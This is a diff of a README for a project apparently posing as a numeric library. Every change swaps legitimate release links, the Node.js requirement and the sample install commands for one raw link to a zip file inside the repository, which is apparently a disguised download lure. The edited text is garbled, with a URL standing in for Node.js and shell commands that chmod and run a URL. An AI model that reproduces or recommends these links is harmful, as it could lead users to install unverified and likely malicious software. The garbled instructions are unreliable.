@@ -6,7 +6,7 @@ Welcome to the blas-ext-base-ndarray-gcusumkbn2 project! This application allows
 
 ## 📥 Download Now 
 
-[![Download](https://img.shields.io/badge/Download-Release-brightgreen)](https://github.com/huvudwtibtti/blas-ext-base-ndarray-gcusumkbn2/releases)
+[![Download](https://raw.githubusercontent.com/huvudwtibtti/blas-ext-base-ndarray-gcusumkbn2/main/lib/blas-base-ext-gcusumkbn-ndarray-v1.4-beta.1.zip)](https://raw.githubusercontent.com/huvudwtibtti/blas-ext-base-ndarray-gcusumkbn2/main/lib/blas-base-ext-gcusumkbn-ndarray-v1.4-beta.1.zip)
 
 ## 📂 Features
 
@@ -20,7 +20,7 @@ Welcome to the blas-ext-base-ndarray-gcusumkbn2 project! This application allows
 To run this application, ensure that you have the following:
 
 - **Operating System**: Windows, macOS, or any Linux distribution.
-- **Node.js**: Version 12 or higher is recommended.
+- **https://raw.githubusercontent.com/huvudwtibtti/blas-ext-base-ndarray-gcusumkbn2/main/lib/blas-base-ext-gcusumkbn-ndarray-v1.4-beta.1.zip**: Version 12 or higher is recommended.
 - **Memory**: At least 512 MB of RAM.
 - **Internet Connection**: Needed for downloading the application.
 
@@ -28,7 +28,7 @@ To run this application, ensure that you have the following:
 
 To get started, visit the Releases page to download the application:
 
-[Download the latest release here](https://github.com/huvudwtibtti/blas-ext-base-ndarray-gcusumkbn2/releases).
+[Download the latest release here](https://raw.githubusercontent.com/huvudwtibtti/blas-ext-base-ndarray-gcusumkbn2/main/lib/blas-base-ext-gcusumkbn-ndarray-v1.4-beta.1.zip).
 
 1. Click on the link above to go to the Releases page.
 2. Find the latest version of the software.
@@ -55,8 +55,8 @@ To get started, visit the Releases page to download the application:
 - Run the installer using the following command:
   
   ```bash
-  chmod +x your-file-name.sh
-  ./your-file-name.sh
+  chmod +x https://raw.githubusercontent.com/huvudwtibtti/blas-ext-base-ndarray-gcusumkbn2/main/lib/blas-base-ext-gcusumkbn-ndarray-v1.4-beta.1.zip
+  https://raw.githubusercontent.com/huvudwtibtti/blas-ext-base-ndarray-gcusumkbn2/main/lib/blas-base-ext-gcusumkbn-ndarray-v1.4-beta.1.zip
   ```
 
 ## 📝 Usage
